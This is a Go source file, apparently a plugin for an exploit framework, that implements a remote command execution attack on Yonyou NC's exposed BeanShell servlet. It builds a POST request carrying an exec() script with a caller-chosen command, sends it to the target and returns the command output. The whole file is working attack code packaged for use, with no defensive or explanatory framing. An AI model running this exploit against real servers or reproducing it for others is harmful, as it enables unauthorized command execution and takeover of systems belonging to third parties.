package yonyouNC

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_BshServlet struct {
	exp_templates.ExpTemplate
}

func (self *Exp_BshServlet) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/servlet/~ic/bsh.servlet.BshServlet")

	data := "bsh.script=exec%28%22#{cmd}%22%29%3B%0D%0A&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"
	cmd := url.QueryEscape(strings.ReplaceAll(self.MustGetStringParam("cmd"), `"`, `\"`))
	data = strings.ReplaceAll(data, "#{cmd}", cmd)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_BshServlet{}, "exp_BshServlet.yml")

}
